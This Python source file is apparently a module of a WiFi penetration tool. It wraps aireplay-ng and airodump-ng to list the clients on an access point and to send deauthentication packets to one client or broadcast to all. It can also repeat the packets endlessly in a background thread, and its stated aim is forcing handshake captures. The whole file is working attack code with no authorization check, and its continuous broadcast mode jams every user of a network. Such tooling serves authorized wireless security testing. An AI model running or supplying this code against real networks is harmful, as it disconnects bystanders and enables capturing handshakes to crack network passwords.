#!/usr/bin/env python3
"""
Deauthentication Module for WiFi Penetration Tool

This module handles sending deauthentication packets to clients
using aireplay-ng to force handshake captures.
"""

import subprocess
import time
import signal
import sys
from typing import List, Optional


class Deauthenticator:
    """Sends deauthentication packets to disconnect clients from access points."""

    def __init__(self, interface: str):
        """
        Initialize the Deauthenticator.
        
        Args:
            interface (str): Wireless interface in monitor mode
        """
        self.interface = interface
        self.deauth_processes = []

    def _signal_handler(self, sig, frame):
        """Handle interrupt signals."""
        self.stop_all_deauth()
        sys.exit(0)

    def send_deauth_packets(self, target_bssid: str, client_mac: str = "", 
                           count: int = 50, delay: float = 0.1) -> bool:
        """
        Send deauthentication packets to a client or broadcast.
        
        Args:
            target_bssid (str): Target access point BSSID
            client_mac (str): Specific client MAC (empty for broadcast)
            count (int): Number of deauth packets to send
            delay (float): Delay between packets in seconds
            
        Returns:
            bool: True if deauth started successfully, False otherwise
        """
        try:
            # Set up signal handler for graceful termination
            signal.signal(signal.SIGINT, self._signal_handler)
            
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '--ignore-negative-one',  # Needed for newer hardware
                '-a', target_bssid
            ]
            
            # Add client MAC if specified
            if client_mac:
                cmd.extend(['-c', client_mac])
                
            cmd.append(self.interface)
            
            # Run aireplay-ng
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.deauth_processes.append(process)
            
            target = client_mac if client_mac else "broadcast"
            print(f"Sending {count} deauth packets to {target} on {target_bssid}")
            
            return True
        except Exception as e:
            print(f"Error sending deauth packets: {e}")
            return False

    def send_continuous_deauth(self, target_bssid: str, client_mac: str = "",
                              delay: int = 10) -> bool:
        """
        Send continuous deauthentication packets in a loop.
        
        Args:
            target_bssid (str): Target access point BSSID
            client_mac (str): Specific client MAC (empty for broadcast)
            delay (int): Delay between bursts in seconds
            
        Returns:
            bool: True if deauth started successfully, False otherwise
        """
        try:
            def _send_loop():
                while True:
                    self.send_deauth_packets(target_bssid, client_mac, count=20)
                    time.sleep(delay)
                    
            # Run in background thread
            import threading
            thread = threading.Thread(target=_send_loop, daemon=True)
            thread.start()
            
            return True
        except Exception as e:
            print(f"Error starting continuous deauth: {e}")
            return False

    def stop_all_deauth(self) -> None:
        """Stop all ongoing deauthentication processes."""
        for process in self.deauth_processes:
            if process.poll() is None:  # Process is still running
                try:
                    process.terminate()
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait()
        
        self.deauth_processes.clear()
        print("All deauthentication processes stopped.")

    def get_connected_clients(self, bssid: str, scan_time: int = 10) -> List[str]:
        """
        Scan for connected clients to a specific BSSID.
        
        Args:
            bssid (str): Target BSSID
            scan_time (int): Time to scan in seconds
            
        Returns:
            List[str]: List of connected client MAC addresses
        """
        clients = []
        try:
            # Run airodump-ng to capture associated clients
            csv_file = "client_scan"
            process = subprocess.Popen([
                'airodump-ng',
                '--bssid', bssid,
                '--write', csv_file,
                '--output-format', 'csv',
                self.interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Let it run for specified time
            time.sleep(scan_time)
            process.terminate()
            process.wait()
            
            # Parse client information from CSV
            try:
                with open(f"{csv_file}-01.csv", 'r') as f:
                    content = f.read()
                    
                # Look for client section
                if 'Station MAC' in content:
                    client_section = content.split('Station MAC')[1]
                    lines = client_section.strip().split('\n')[1:]  # Skip header
                    
                    for line in lines:
                        if line.strip():
                            parts = [part.strip() for part in line.split(',')]
                            if len(parts) > 0 and parts[0]:  # Valid MAC address
                                clients.append(parts[0])
                                
            except Exception as e:
                print(f"Error parsing client data: {e}")
                
        except Exception as e:
            print(f"Error scanning for clients: {e}")
            
        return clients


def main():
    """Main function for testing the Deauthenticator."""
    if len(sys.argv) < 3:
        print("Usage: python3 deauther.py <monitor_interface> <target_bssid> [client_mac]")
        sys.exit(1)
        
    interface = sys.argv[1]
    target_bssid = sys.argv[2]
    client_mac = sys.argv[3] if len(sys.argv) > 3 else ""
    
    deauther = Deauthenticator(interface)
    
    print(f"Sending deauth packets to {target_bssid}...")
    if client_mac:
        print(f"Targeting client: {client_mac}")
    else:
        print("Broadcasting to all clients")
        
    if deauther.send_deauth_packets(target_bssid, client_mac):
        print("Deauthentication packets sent successfully.")
    else:
        print("Failed to send deauthentication packets.")


if __name__ == "__main__":
    main()